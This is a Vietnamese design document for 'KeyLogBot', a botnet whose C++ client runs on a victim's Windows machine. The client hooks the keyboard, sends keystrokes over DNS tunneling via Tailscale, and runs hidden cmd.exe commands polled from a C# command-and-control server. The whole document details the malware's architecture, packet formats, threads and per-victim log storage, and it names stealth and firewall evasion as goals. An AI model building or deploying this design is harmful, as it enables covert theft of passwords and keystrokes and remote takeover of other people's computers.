# TÀI LIỆU KIẾN TRÚC HỆ THỐNG KEYLOGBOT

## 📋 TỔNG QUAN

KeyLogBot là hệ thống botnet sử dụng **DNS Tunneling** qua Tailscale để truyền tải dữ liệu giữa Client (nạn nhân) và Server (C&C - Command & Control). Hệ thống gồm 2 thành phần chính:

- **Client** (C++): Chạy trên máy nạn nhân, thu thập keylog và thực thi lệnh từ xa
- **Server** (C#): Chạy trên máy tấn công, nhận dữ liệu và điều khiển client

### Kiến trúc mạng

```
┌─────────────────────────────────────────────────────────────┐
│                    TAILSCALE NETWORK                        │
│                      (100.x.x.x/16)                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌──────────────┐         ┌──────────────┐                │
│  │   Client     │   DNS   │  DNS Resolver│                │
│  │  (Victim)    │────────>│   (Bind9)    │                │
│  │ 100.x.x.x    │  Queries│ 100.111.111.100│              │
│  └──────────────┘         └──────┬───────┘                │
│         │                         │                         │
│         │                         │ Forward                │
│         │                         │ Protocol                │
│         │                         │ Queries                │
│         │                         ▼                         │
│         │                  ┌──────────────┐                │
│         │                  │  C&C Server  │                │
│         │<─────────────────│ 100.123.123.123│              │
│         │   DNS Responses  └──────────────┘                │
│         │                                                   │
└─────────────────────────────────────────────────────────────┘
```

### Đặc điểm chính

1. **DNS Tunneling**: Mọi giao tiếp được đóng gói trong DNS queries/responses
2. **Tailscale VPN**: Tạo mạng riêng ảo, tránh firewall
3. **Dual-stream**: 2 luồng dữ liệu độc lập (keylog + shell)
4. **Stealth**: Không cần mở port, traffic giống DNS bình thường

---

## 🏗️ KIẾN TRÚC CLIENT (C++)

### Cấu trúc thư mục
```
Client/
├── Main.cpp              # Entry point, khởi tạo các thread
├── Network.cpp/.h        # Giao tiếp DNS
├── KeyLogger.cpp/.h      # Hook bàn phím
├── Botnet.cpp/.h         # Xử lý lệnh từ xa
├── Shell.cpp/.h          # Thực thi cmd.exe
├── ConsoleClient.h       # Interface gửi dữ liệu
└── IClient.h             # Abstract interface
```

### Luồng thực thi chính

```
WinMain()
  ├─> [1] Tạo mutex (chống chạy 2 lần)
  ├─> [2] Lấy Tailscale IP (getLocalTailscaleIP)
  ├─> [3] Kết nối server (startConnection)
  ├─> [4] Khởi động KeyLogger Hook
  ├─> [5] Tạo 3 threads:
  │       ├── senderThread()        → Gửi keylog
  │       ├── senderBotnetThread()  → Gửi/nhận lệnh shell
  │       └── handle_botnet()       → Thực thi lệnh
  └─> [6] Message loop (giữ hook hoạt động)
```

### 3 Thread chính

#### 🔴 Thread 1: Keylogger (senderThread)
**File**: `KeyLogger.cpp`

**Chức năng**: 
- Hook bàn phím với `SetWindowsHookEx(WH_KEYBOARD_LL)`
- Thu thập phím nhấn vào buffer
- Gửi định kỳ lên server qua DNS

**Luồng hoạt động**:
```
process_key() (Hook callback)
  ├─> Bắt phím nhấn (WM_KEYDOWN)
  ├─> Xử lý phím đặc biệt ([BS], [TAB], [ENTR], ...)
  ├─> Xử lý tổ hợp phím (Ctrl+X, Alt+Y)
  ├─> Thêm vào keystrokeBuffer
  └─> Nếu buffer đầy (≥10 ký tự)
      └─> Đẩy vào sendQueue

senderThread() (Worker thread)
  ├─> Loop vô hạn:
  │   ├─> Lấy dữ liệu từ sendQueue
  │   ├─> Gọi sendData() (type B)
  │   ├─> Tăng keylog_packetNumber
  │   └─> Sleep(100ms) nếu queue trống
  └─> Dừng khi shouldStopSender = true
```

**Biến toàn cục**:
- `keystrokeBuffer`: Buffer tích lũy phím
- `sendQueue`: Queue thread-safe chứa batch để gửi
- `keylog_packetNumber`: Đếm gói tin (0-999, sau đó reset)
- `queueMutex`: Bảo vệ sendQueue

---

#### 🔵 Thread 2: Botnet Sender/Receiver (senderBotnetThread)
**File**: `Botnet.cpp`

**Chức năng**:
- **Poll lệnh từ server** (sendDataTypeP)
- **Gửi kết quả shell** lên server (sendDataTypeC)

**Luồng hoạt động**:
```
senderBotnetThread()
  ├─> [Bước 1] Poll lệnh từ server
  │   └─> Loop gọi sendDataTypeP()
  │       ├─> Gửi: p.packetNum.offset.id.domain (DNS TXT query)
  │       ├─> Nhận TXT response chứa command chunk (hex)
  │       ├─> Ghép các chunk → full command
  │       └─> Đẩy vào execute_queue
  │
  ├─> [Bước 2] Gửi kết quả shell
  │   └─> Lấy dữ liệu từ send_queue
  │       └─> Chia thành chunks (max 30 bytes/chunk)
  │           └─> Gửi từng chunk qua sendDataTypeC()
  │               └─> c.packetNum.offset.id.HEXDATA.domain
  │
  └─> Sleep(5s) nếu không có việc gì
```

**Biến toàn cục**:
- `send_queue`: Kết quả shell chờ gửi
- `execute_queue`: Lệnh từ server chờ thực thi
- `botnet_packetNumber`: Đếm gói (0-999)
- `max_len = 30`: Kích thước chunk tối đa

---

#### 🟢 Thread 3: Command Executor (handle_botnet)
**File**: `Botnet.cpp`, `Shell.cpp`

**Chức năng**: 
- Tạo cmd.exe session
- Thực thi lệnh từ execute_queue
- Đẩy output vào send_queue

**Luồng hoạt động**:
```
handle_botnet()
  ├─> Tạo ConsoleClient và Shell
  ├─> shell.CreateSession()
  │   ├─> Tạo 3 pipes (stdin, stdout, stderr)
  │   ├─> Spawn cmd.exe với CREATE_NO_WINDOW
  │   └─> Tạo 2 threads đọc output:
  │       ├── RedirectReadThread(stdout)
  │       └── RedirectReadThread(stderr)
  │
  └─> Loop vô hạn:
      ├─> Lấy lệnh từ execute_queue
      ├─> shell.ExecuteCommand()
      │   ├─> Chuyển UTF-8 → OEM encoding
      │   └─> WriteFile() vào stdin của cmd.exe
      └─> Sleep(100ms) nếu queue trống

RedirectReadThread() (trong Shell.cpp)
  ├─> Loop đọc pipe của cmd.exe
  ├─> Tích lũy output vào buffer
  ├─> Phát hiện prompt ">" → flush buffer
  └─> Gọi _client->Send()
      └─> EnqueueSend()
          └─> Đẩy vào send_queue
```

**Các class quan trọng**:
- `IClient`: Interface với method `Send()`
- `ConsoleClient`: Implement IClient, gọi `EnqueueSend()`
- `Shell`: Quản lý cmd.exe process và pipes

---

## 🌐 MODULE NETWORK (Client)

**File**: `Network.cpp`, `Network.h`

### Hàm chính

#### 1. `getLocalTailscaleIP()`
**Mục đích**: Lấy IP Tailscale (100.x.x.x) của máy

**Cách hoạt động**:
```
GetAdaptersAddresses()
  ├─> Duyệt tất cả network adapters
  ├─> Tìm IP bắt đầu bằng "100."
  └─> Return Tailscale IP hoặc IP non-loopback đầu tiên
```

---

#### 2. `startConnection(domain)`
**Mục đích**: Kết nối lần đầu, nhận Connection ID

**Gói tin gửi**:
```
Query: a.[VictimIP].example.test
       ↓
       a.100.50.50.50.example.test
Type: DNS A query
```

**Luồng xử lý**:
```
startConnection()
  ├─> Lấy victimIP = getLocalTailscaleIP()
  ├─> Tạo query: "a." + victimIP + "." + domain
  ├─> Gửi DNS A query đến DNS_SERVER_IP (100.111.111.100)
  ├─> Nhận response: IP dạng X.Y.Z.[ConnectionID]
  ├─> Parse octet cuối → connectionId
  └─> Return connectionId
```

**Response từ server**: 
```
IP: 123.45.67.1  → ConnectionID = 1
IP: 200.10.20.5  → ConnectionID = 5
```

---

#### 3. `sendData(id, packetNumber, domain, data)`
**Mục đích**: Gửi dữ liệu keylog (Type B)

**Gói tin gửi**:
```
Query: b.[packetNum].[id].[HEXDATA].example.test
       ↓
       b.0.1.48656c6c6f.example.test  (data="Hello")
Type: DNS A query
```

**Luồng xử lý**:
```
sendData()
  ├─> Chuyển data → hex bằng convertToHex()
  ├─> Tạo query: "b." + packetNum + "." + id + "." + hex + "." + domain
  ├─> Gửi DNS A query
  ├─> Nhận response IP
  ├─> Parse octet đầu = ResponseCode:
  │   ├─> 200 (OK)         → Thành công
  │   ├─> 201 (MALFORMED)  → Lỗi cú pháp
  │   ├─> 202 (NX)         → Kết nối không tồn tại → reconnect
  │   ├─> 203 (OOO)        → Out of order → reset packetNumber
  │   └─> 204 (MAX)        → Server đầy
  └─> Return 0 nếu OK, -1 nếu lỗi
```

---

#### 4. `sendDataTypeC(id, packetNumber, offset, domain, hexData)`
**Mục đích**: Gửi shell output (Type C) - Hỗ trợ chunking

**Gói tin gửi**:
```
Query: c.[packetNum].[offset].[id].[HEXDATA].example.test
       ↓
       c.0.0.1.646972.example.test  (chunk đầu, data="dir")
       c.0.1.1.0a43.example.test    (chunk thứ 2)
Type: DNS A query
```

**Luồng xử lý**: Tương tự sendData(), nhưng có thêm `offset` để đánh dấu chunk thứ mấy

---

#### 5. `sendDataTypeP(id, packetNumber, offset, domain)`
**Mục đích**: Poll lệnh từ server (Type P)

**Gói tin gửi**:
```
Query: p.[packetNum].[offset].[id].example.test
       ↓
       p.0.0.1.example.test
Type: DNS TXT query (không phải A query!)
```

**Luồng xử lý**:
```
sendDataTypeP()
  ├─> Tạo query: "p." + packetNum + "." + offset + "." + id + "." + domain
  ├─> Gửi DNS TXT query
  ├─> Nhận TXT response
  ├─> Nếu TXT rỗng → không có lệnh → return 0
  ├─> Nếu có TXT data:
  │   ├─> Parse hex từ TXT record
  │   ├─> Decode hex → UTF-8 string
  │   ├─> Lưu vào g_outChunk (biến toàn cục)
  │   └─> Return 1 (có chunk)
  └─> Caller sẽ gọi lại với offset++ để lấy chunk tiếp
```

**Ví dụ TXT response**:
```
TXT: "646972"     → decode = "dir"
TXT: ""           → không có lệnh
```

---

#### 6. `convertToHex(string)`
**Mục đích**: Chuyển ASCII → hex string

**Ví dụ**:
```
"Hello" → "48656c6c6f"
"A"     → "41"
```

---

## 🖥️ KIẾN TRÚC SERVER (C#)

### Cấu trúc thư mục
```
Server/
├── Program.cs                    # Entry point
├── Logic/
│   ├── ServerLogic.cs           # Core logic, xử lý DNS
│   ├── ClientManager.cs         # Quản lý clients
│   └── ProtocolHandler.cs       # Parse protocol
├── Models/
│   ├── ClientInfo.cs            # Thông tin client
│   ├── DataParser.cs            # Buffer và lưu log
│   └── DNSProtocol.cs           # Response codes, exceptions
├── DNS/
│   ├── DNSParser.cs             # Parse DNS query
│   └── DNSResponseBuilder.cs   # Tạo DNS response
├── Utilities/
│   └── IPGenerator.cs           # Tạo IP giả cho response
└── UI/
    ├── KeyLoggerForm.cs         # Giao diện chính
    └── RemoteShellForm.cs       # Giao diện shell
```

---

## 📡 MODULE SERVERLOGIC

**File**: `ServerLogic.cs`

### Biến quan trọng
```csharp
_udpServer: UdpClient              // Lắng nghe port 53
_domain: string                    // example.com
_serverIp: string                  // 100.123.123.123
_clientManager: ClientManager      // Quản lý clients
_protocolHandler: ProtocolHandler  // Parse queries
_commandQueues: Dict<int, Queue<string>>  // Queue lệnh cho từng client
_commandChunkState: Dict<int, (fullCmd, totalChunks, currentChunk)>
```

### Luồng khởi động

```
Start(port, domain, logPath, serverIp)
  ├─> Tạo ClientManager và ProtocolHandler
  ├─> Bind UdpServer lên serverIp:port (100.123.123.123:53)
  ├─> LogMessage: Server info
  └─> Task.Run(() => ListenForQueries())

ListenForQueries()
  ├─> Loop:
  │   ├─> await _udpServer.ReceiveAsync()
  │   └─> Task.Run(() => ProcessQuery())
  └─> Xử lý từng query trong thread riêng
```

---

## 🔄 LUỒNG XỬ LÝ CÁC GÓI TIN

### 1️⃣ TYPE A - Kết nối (Client → Server)

**Query từ client**:
```
a.100.50.50.50.example.test  (A query)
```

**Xử lý trên server**:
```
ProcessQuery()
  ├─> DNSParser.ParseQuery() → lấy queryName
  ├─> _protocolHandler.GetData() → trích xuất phần protocol
  │   └─> Kết quả: "a.100.50.50.50"
  │
  ├─> if (packetType == "a"):
  │   ├─> Parse IP từ query → victimIP = "100.50.50.50"
  │   ├─> Kiểm tra IP đã tồn tại?
  │   │   ├─> Có: Lấy connectionId cũ
  │   │   └─> Không: Tạo mới bằng _clientManager.AddClient()
  │   │
  │   ├─> Tạo command queue cho client mới
  │   ├─> Tạo fake IP response: IPGenerator.CreateStartIp(connectionId-1)
  │   │   └─> Ví dụ: 123.45.67.1 (octet cuối = connectionId)
  │   │
  │   └─> DNSResponseBuilder.CreateSimpleAResponse()
  │       └─> Trả về: IP 123.45.67.[connectionId]
  │
  └─> _udpServer.Send(response, remoteEP)
```

**Response gửi về client**: 
```
DNS A record: 123.45.67.1  → Client parse octet cuối = ConnectionID 1
```

**Hàm liên quan**:
- `ClientManager.AddClient(victimIP)`: Tạo DataParser mới, return connectionId
- `IPGenerator.CreateStartIp(connections)`: Tạo IP ngẫu nhiên với octet cuối = connectionId+1

---

### 2️⃣ TYPE B - Keylogger Data (Client → Server)

**Query từ client**:
```
b.0.1.48656c6c6f.example.test  (packetNum=0, id=1, data="Hello")
```

**Xử lý trên server**:
```
ProcessQuery()
  ├─> if (packetType == "b"):
  │   ├─> Parse: b.[packetNum].[id].[hexData]
  │   │   └─> packetNum=0, id=1, hexData="48656c6c6f"
  │   │
  │   ├─> _protocolHandler.ParseDataPacket(rest, _clientManager)
  │   │   ├─> Kiểm tra connectionId có tồn tại?
  │   │   ├─> Decode hex → ASCII
  │   │   ├─> parser.AddDataByType(packetNum, data, LogType.Keylogger)
  │   │   │   ├─> Kiểm tra duplicate packet
  │   │   │   ├─> Kiểm tra out-of-order
  │   │   │   └─> Lưu vào buffer
  │   │   └─> Return (packetNumber, connectionId)
  │   │
  │   ├─> parser.SaveDataByType(keylogData, LogType.Keylogger)
  │   │   ├─> Tích lũy vào _keylogBuffer
  │   │   ├─> Nếu đủ 50 ký tự:
  │   │   │   └─> Ghi vào file: logs/[IP]/keylog_2025-12-21.txt
  │   │   │       └─> Format: [HH:mm:ss] [buffer content]\n
  │   │   └─> Clear buffer
  │   │
  │   ├─> LogMessage("[Keylog] Client #1")
  │   ├─> Tạo response IP: IPGenerator.CreateResponseIp(ResponseCode.OK)
  │   │   └─> 200.x.y.z (octet đầu = 200 = OK)
  │   │
  │   └─> DNSResponseBuilder.CreateSimpleAResponse()
  │
  └─> _udpServer.Send(response)
```

**Response gửi về**: 
```
DNS A: 200.10.20.30  → Client parse octet đầu = 200 (OK)
```

**Hàm quan trọng**:

#### `ProtocolHandler.ParseDataPacket(data, clientManager)`
```
Input: "0.1.48656c6c6f" (packetNum.id.hexData)
Xử lý:
  ├─> Split('.')
  ├─> Parse int packetNumber, connectionId
  ├─> Convert.FromHexString(hexData) → byte[]
  ├─> Encoding.ASCII.GetString() → string
  ├─> parser.AddDataByType()
  └─> Return (packetNumber, connectionId)
```

#### `DataParser.AddDataByType(packetNum, data, LogType.Keylogger)`
```
Kiểm tra:
  ├─> if (packetNum == _lastReceivedKeylogPacket)
  │   └─> throw DuplicatePacketException  → Ignore silent
  │
  ├─> if (packetNum <= _lastReceivedKeylogPacket && packetNum != 0)
  │   └─> throw PacketsOutOfOrderException  → Response 203
  │
  └─> _data.AddRange(data)
      _lastReceivedKeylogPacket = packetNum
```

#### `DataParser.SaveDataByType(data, LogType.Keylogger)`
```
_keylogBuffer.Append(data)
_keylogCharCount += data.Length

if (_keylogCharCount >= 50):  // KEYLOG_BUFFER_SIZE
  ├─> timestamp = DateTime.Now.ToString("HH:mm:ss")
  ├─> logLine = $"[{timestamp}] {_keylogBuffer}\n"
  ├─> File.AppendAllText("logs/[IP]/keylog_[date].txt", logLine)
  └─> Clear buffer
```

---

### 3️⃣ TYPE C - Shell Output (Client → Server)

**Query từ client**:
```
c.0.0.1.646972.example.test  (packetNum=0, offset=0, id=1, data="dir")
c.0.1.1.0a43.example.test    (packetNum=0, offset=1, id=1, chunk tiếp)
```

**Xử lý trên server**:
```
ProcessQuery()
  ├─> if (packetType == "c"):
  │   ├─> Parse: c.[packetNum].[offset].[id].[hexData]
  │   │   └─> Xử lý hexData có thể chứa dấu '.' (ghép lại)
  │   │
  │   ├─> Kiểm tra connectionId tồn tại
  │   ├─> parser.AddDataByType(packetNum, data, LogType.Shell)
  │   ├─> Decode hex → UTF-8
  │   ├─> parser.SaveDataByType(shellData, LogType.Shell)
  │   │   ├─> Tích lũy vào _shellBuffer
  │   │   ├─> Nếu kết thúc bằng ">" (prompt):
  │   │   │   └─> Ghi vào logs/[IP]/shell_[date].txt
  │   │   │       └─> Format: [HH:mm:ss] [full output]\n
  │   │   └─> Clear buffer
  │   │
  │   ├─> OnCommandResult?.Invoke(connectionId, decodedText)
  │   ├─> Response IP: 200.x.y.z (OK)
  │   └─> DNSResponseBuilder.CreateSimpleAResponse()
  │
  └─> _udpServer.Send(response)
```

**Điểm khác với Type B**:
- Có thêm `offset` để hỗ trợ chunking
- Lưu vào LogType.Shell thay vì Keylogger
- Phát hiện kết thúc lệnh bằng dấu ">"

---

### 4️⃣ TYPE P - Poll Command (Client → Server)

**Query từ client**:
```
p.0.0.1.example.test  (packetNum=0, offset=0, id=1)
Type: DNS TXT query (không phải A!)
```

**Xử lý trên server**:
```
ProcessQuery()
  ├─> if (packetType == "p" && queryType == 16):  // TXT query
  │   ├─> Parse: p.[packetNum].[offset].[id]
  │   ├─> Kiểm tra connectionId tồn tại
  │   │
  │   ├─> lock (_commandQueues):
  │   │   ├─> if (!_commandChunkState.ContainsKey(connectionId)):
  │   │   │   ├─> Lấy lệnh từ _commandQueues[connectionId].Dequeue()
  │   │   │   ├─> Tính totalChunks = Math.Ceiling(fullCommand.Length / 60.0)
  │   │   │   └─> Lưu state: (fullCommand, totalChunks, 0)
  │   │   │
  │   │   ├─> if (state tồn tại):
  │   │   │   ├─> chunkStart = offset * 60
  │   │   │   ├─> Lấy chunk từ fullCommand
  │   │   │   ├─> Encode chunk → hex
  │   │   │   └─> Nếu là chunk cuối → Remove state
  │   │   │
  │   │   └─> commandChunk = hex string (hoặc "")
  │   │
  │   └─> DNSResponseBuilder.CreateTXTResponse(data, dnsQuery, commandChunk)
  │       └─> TXT record chứa hex data
  │
  └─> _udpServer.Send(response)
```

**Response TXT record**:
```
TXT: "646972"       → Client decode = "dir" (chunk đầu)
TXT: "0a"           → Client decode = "\n" (chunk cuối)
TXT: ""             → Không còn chunk (hoặc không có lệnh)
```

**State management**:
```
_commandChunkState = {
  1: ("dir\necho test\n", 2, 0),  // Client #1, 2 chunks
  2: ("ipconfig\n", 1, 0)         // Client #2, 1 chunk
}
```

**Workflow gửi lệnh**:
```
UI enqueue command "dir\n"
  ↓
_commandQueues[1].Enqueue("dir\n")
  ↓
Client gửi: p.0.0.1.example.test (offset=0)
  ↓
Server:
  - Lấy "dir\n" từ queue
  - Chia thành 1 chunk (< 60 chars)
  - State: ("dir\n", 1, 0)
  - Return TXT: "6469720a"
  ↓
Client gửi: p.0.1.1.example.test (offset=1)
  ↓
Server:
  - offset=1 >= length → no more chunks
  - Remove state
  - Return TXT: ""
  ↓
Client nhận TXT rỗng → biết đã nhận đủ
```

---

## 📊 BẢNG TÓM TẮT PROTOCOL

| Type | Query Format | Query Type | Dữ liệu | Response Type | Response Format | Mục đích |
|------|-------------|-----------|---------|--------------|----------------|----------|
| **A** | `a.[IP].domain` | DNS A | Victim IP | DNS A | `x.y.z.[ConnectionID]` | Kết nối lần đầu |
| **B** | `b.[pkt].[id].[hex].domain` | DNS A | Keylog data | DNS A | `[Code].x.y.z` | Gửi keylog |
| **C** | `c.[pkt].[off].[id].[hex].domain` | DNS A | Shell output | DNS A | `[Code].x.y.z` | Gửi kết quả shell |
| **P** | `p.[pkt].[off].[id].domain` | DNS TXT | Poll request | DNS TXT | `[hex chunk]` | Lấy lệnh từ server |

### Response Codes
```
200 = OK          → Thành công
201 = MALFORMED   → Cú pháp sai
202 = NX          → Connection không tồn tại
203 = OOO         → Out of Order
204 = MAX         → Server đầy
```

---

## 🔀 VÍ DỤ LUỒNG DỮ LIỆU HOÀN CHỈNH

### Scenario: Client kết nối, gửi keylog, nhận lệnh "dir", gửi kết quả

```
[1] CLIENT KHỞI ĐỘNG
────────────────────
Client.Main.cpp: WinMain()
  ├─> getLocalTailscaleIP() → "100.50.50.50"
  ├─> startConnection("example.test")
  │   └─> Gửi: a.100.50.50.50.example.test
  │
  └─> Chờ response...

Server.ServerLogic: ProcessQuery()
  ├─> Parse query → packetType = "a", victimIP = "100.50.50.50"
  ├─> ClientManager.AddClient("100.50.50.50") → connectionId = 1
  ├─> IPGenerator.CreateStartIp(0) → "123.45.67.1"
  └─> Response DNS A: 123.45.67.1

Client nhận: 123.45.67.1
  └─> Parse octet cuối → connectionId = 1
      └─> Kết nối thành công!


[2] KEYLOGGER GỬI DỮ LIỆU
──────────────────────────
Client gõ: "Hello"
  ↓
KeyLogger.process_key()
  ├─> keystrokeBuffer = "Hello"
  ├─> Đẩy vào sendQueue
  └─> ...

KeyLogger.senderThread()
  ├─> Lấy "Hello" từ sendQueue
  ├─> convertToHex("Hello") → "48656c6c6f"
  ├─> sendData(1, 0, "example.test", "Hello")
  │   └─> Gửi: b.0.1.48656c6c6f.example.test
  └─> ...

Server.ServerLogic: ProcessQuery()
  ├─> Parse → packetType="b", packetNum=0, id=1, hex="48656c6c6f"
  ├─> ProtocolHandler.ParseDataPacket()
  │   ├─> Decode hex → "Hello"
  │   └─> DataParser.AddDataByType(0, "Hello", Keylogger)
  ├─> DataParser.SaveDataByType("Hello", Keylogger)
  │   ├─> _keylogBuffer = "Hello" (5 chars)
  │   └─> (Chưa đủ 50 chars, chưa ghi file)
  ├─> Response DNS A: 200.10.20.30 (OK)
  └─> ...

Client nhận: 200.10.20.30
  └─> Parse octet đầu = 200 (OK)
      └─> Gửi thành công! Tăng packetNumber


[3] SERVER GỬI LỆNH "dir"
─────────────────────────
Server UI: EnqueueCommand(1, "dir\n")
  └─> _commandQueues[1].Enqueue("dir\n")

Client.Botnet.senderBotnetThread()
  ├─> sendDataTypeP(1, 0, 0, "example.test")
  │   └─> Gửi: p.0.0.1.example.test (DNS TXT query)
  └─> ...

Server.ServerLogic: ProcessQuery()
  ├─> Parse → packetType="p", packetNum=0, offset=0, id=1
  ├─> lock (_commandQueues):
  │   ├─> Lấy "dir\n" từ queue
  │   ├─> State: ("dir\n", 1, 0)
  │   ├─> chunk = "dir\n" (offset=0, length=4)
  │   ├─> Encode → hex "6469720a"
  │   └─> Remove state (chunk cuối)
  ├─> Response DNS TXT: "6469720a"
  └─> ...

Client nhận TXT: "6469720a"
  ├─> Decode hex → "dir\n"
  ├─> g_outChunk = L"dir\n"
  ├─> return 1 (có chunk)
  └─> ...

Client: senderBotnetThread()
  ├─> Gọi lại sendDataTypeP(1, 0, 1, ...) (offset=1)
  └─> Nhận TXT: "" → Không còn chunk
      └─> fullCommand = "dir\n"
          └─> EnqueueExecute("dir\n")


[4] THỰC THI LỆNH VÀ GỬI KẾT QUẢ
────────────────────────────────
Client.Botnet.handle_botnet()
  ├─> Lấy "dir\n" từ execute_queue
  ├─> shell.ExecuteCommand("dir\n")
  │   ├─> WriteFile vào stdin của cmd.exe
  │   └─> ...
  └─> ...

Client.Shell.RedirectReadThread()
  ├─> ReadFile từ stdout của cmd.exe
  ├─> Nhận output: " Volume in drive C...\n Directory of...\n >"
  ├─> Phát hiện prompt ">" → Flush buffer
  ├─> _client->Send(output)
  │   └─> EnqueueSend(output)
  │       └─> Đẩy vào send_queue
  └─> ...

Client.Botnet.senderBotnetThread()
  ├─> Lấy output từ send_queue (giả sử 100 bytes)
  ├─> Chia thành chunks (max 30 bytes):
  │   ├─> Chunk 0: bytes[0:30]   → hex1
  │   ├─> Chunk 1: bytes[30:60]  → hex2
  │   ├─> Chunk 2: bytes[60:90]  → hex3
  │   └─> Chunk 3: bytes[90:100] → hex4
  ├─> Gửi từng chunk:
  │   ├─> sendDataTypeC(1, 0, 0, "example.test", hex1)
  │   │   └─> c.0.0.1.[hex1].example.test
  │   ├─> sendDataTypeC(1, 0, 1, "example.test", hex2)
  │   │   └─> c.0.1.1.[hex2].example.test
  │   ├─> ...
  │   └─> c.0.3.1.[hex4].example.test
  └─> ...

Server nhận từng query c:
  ├─> Parse → packetType="c", packetNum=0, offset=0-3, id=1
  ├─> DataParser.AddDataByType(0, chunk, LogType.Shell)
  ├─> Decode hex → ASCII
  ├─> DataParser.SaveDataByType(text, LogType.Shell)
  │   ├─> _shellBuffer.Append(text)
  │   ├─> Phát hiện kết thúc ">" → Ghi file
  │   └─> File: logs/100.50.50.50/shell_2025-12-21.txt
  │       └─> [HH:mm:ss] [full shell output]\n
  ├─> Response: 200.x.y.z (OK)
  └─> ...

Client nhận response OK → Tiếp tục gửi chunk tiếp
  └─> Hoàn thành gửi toàn bộ output!
```

---

## 📁 CHI TIẾT CÁC CLASS QUAN TRỌNG

### ClientManager.cs
**Chức năng**: Quản lý danh sách clients, tạo DataParser

**Methods**:
```csharp
AddClient(string clientIp)
  → Tạo DataParser mới
  → Tạo thư mục logs/[IP]/
  → Fire event OnClientAdded
  → Return connectionId (1-based)

GetParser(int connectionId)
  → Return DataParser tương ứng
  → Null nếu không tồn tại

ConnectionExists(int connectionId)
  → Kiểm tra connectionId hợp lệ

GetConnectionIdByIp(string clientIp)
  → Tìm connectionId từ IP
  → Return -1 nếu không tìm thấy

SaveAllLogs(logCallback)
  → Flush tất cả _keylogBuffer và _shellBuffer
  → Gọi khi shutdown server
```

**Biến**:
```csharp
_dataParsers: List<DataParser>  // Index = connectionId - 1
_logPath: string                 // "logs/"
```

---

### DataParser.cs
**Chức năng**: Buffer dữ liệu, kiểm tra packet order, lưu log

**Properties**:
```csharp
ClientIP: string
_lastReceivedKeylogPacket: int   // Packet tracking cho keylog
_lastReceivedShellPacket: int    // Packet tracking cho shell
_keylogBuffer: StringBuilder     // Tích lũy keylog
_shellBuffer: StringBuilder      // Tích lũy shell output
```

**Methods**:
```csharp
AddDataByType(packetNum, data, logType)
  → Kiểm tra duplicate/out-of-order
  → Throw exception nếu cần
  → Lưu data vào _data list
  → Cập nhật _lastReceivedXXXPacket

SaveDataByType(data, logType)
  → Append vào buffer tương ứng
  → Nếu keylog: Ghi file khi đủ 50 chars
  → Nếu shell: Ghi file khi gặp prompt ">"
  → Format: [timestamp] [content]\n
  → File: logs/[IP]/keylog_[date].txt hoặc shell_[date].txt

FlushLogs()
  → Ghi remaining buffer vào file
  → Gọi khi shutdown
```

---

### ProtocolHandler.cs
**Chức năng**: Parse query name, trích xuất data

**Methods**:
```csharp
GetData(string full)
  → Input: "b.0.1.48656c6c6f.example.test"
  → Strip domain: "b.0.1.48656c6c6f"
  → Xử lý đặc biệt cho type A (có IP), type C (hex chứa dấu .)
  → Return: Protocol part

ParseDataPacket(string data, clientManager)
  → Input: "0.1.48656c6c6f"
  → Split('.') → [packetNum, id, hexData]
  → Convert.FromHexString() → byte[]
  → parser.AddDataByType()
  → Fire event OnDataReceived
  → Return (packetNumber, connectionId)
```

---

### DNSParser.cs
**Chức năng**: Parse raw DNS query bytes

**Method**:
```csharp
ParseQuery(byte[] data)
  → Parse DNS header (12 bytes)
  → Extract TransactionId từ bytes[0-1]
  → Parse query name từ bytes[12+]
  │   → Đọc label lengths
  │   → Build domain string
  └─> Parse query type (A=1, TXT=16)
  → Return DNSQueryInfo { QueryName, TransactionId, QueryType }
```

---

### DNSResponseBuilder.cs
**Chức năng**: Tạo raw DNS response bytes

**Methods**:
```csharp
CreateSimpleAResponse(originalQuery, query, ipAddress)
  → Tạo DNS header (flags: 0x8180 = response, authoritative)
  → Copy question section từ originalQuery
  → Thêm answer section:
  │   → Type A (0x0001)
  │   → IP address (4 bytes)
  │   → TTL = 0 (không cache)
  └─> Return byte[]

CreateTXTResponse(originalQuery, query, txtData)
  → Tạo DNS header
  → Copy question section
  → Thêm TXT answer:
  │   → Type TXT (0x0010)
  │   → Length byte + UTF-8 data
  │   → TTL = 0
  └─> Return byte[]

CreateEmptyResponse(originalQuery, query)
  → Response không có answer section (ANCOUNT=0)
  → Dùng cho queries không liên quan
```

---

### IPGenerator.cs
**Chức năng**: Tạo IP giả cho responses

**Methods**:
```csharp
CreateStartIp(int connections)
  → connections = connectionId - 1
  → Tạo IP ngẫu nhiên: X.Y.Z.[connections+1]
  → X không thuộc reserved (0,10,127,169,172,192,200-204,224,233,250,255)
  → Return: Ví dụ "123.45.67.1" nếu connectionId=1

CreateResponseIp(ResponseCode code)
  → Tạo IP: [code].Y.Z.W
  → code = 200/201/202/203/204
  → Y,Z,W ngẫu nhiên
  → Return: Ví dụ "200.10.20.30" cho OK
```

---

## 🔐 XỬ LÝ LỖI VÀ EXCEPTIONS

### Client-side
```cpp
// Network.cpp - sendData(), sendDataTypeC()
Response code từ server:
  200 (OK)        → return 0, thành công
  201 (MALFORMED) → retry? hoặc skip
  202 (NX)        → Gọi startConnection() để reconnect
  203 (OOO)       → Reset packetNumber = 0
  204 (MAX)       → Server đầy, break
```

### Server-side
```csharp
// ServerLogic.cs - ProcessQuery()
try {
  // Parse và xử lý
}
catch (ShortCircuitException) {
  // Duplicate packet, ignore silent
  → Return empty response
}
catch (DNSSyntaxException) {
  // Cú pháp sai
  → Response: 201.x.y.z
}
catch (NXConnectionException) {
  // Connection không tồn tại
  → Response: 202.x.y.z
}
catch (PacketsOutOfOrderException) {
  // Out of order
  → Response: 203.x.y.z
}
catch (ServerMaxConnectionsException) {
  // Đầy
  → Response: 204.x.y.z
}
```

### DataParser Exceptions
```csharp
DuplicatePacketException
  → Thrown khi packetNum == _lastReceived
  → Server ignore silent (BIND9 có thể forward 2 lần)

PacketsOutOfOrderException
  → Thrown khi packetNum < _lastReceived && packetNum != 0
  → Server response 203 → Client reset về 0
```

---

## 🔄 PACKET TRACKING & SEQUENCING

### Tại sao cần 2 packet counters?

**Client có 2 luồng độc lập**:
1. **Keylogger stream** (Type B): `keylog_packetNumber`
2. **Botnet/Shell stream** (Type C): `botnet_packetNumber`

**Server tracking riêng**:
```csharp
_lastReceivedKeylogPacket  // Cho type B
_lastReceivedShellPacket   // Cho type C
```

**Lý do**: 
- Keylog và shell gửi song song, không đợi nhau
- Nếu dùng chung counter → OOO false positive

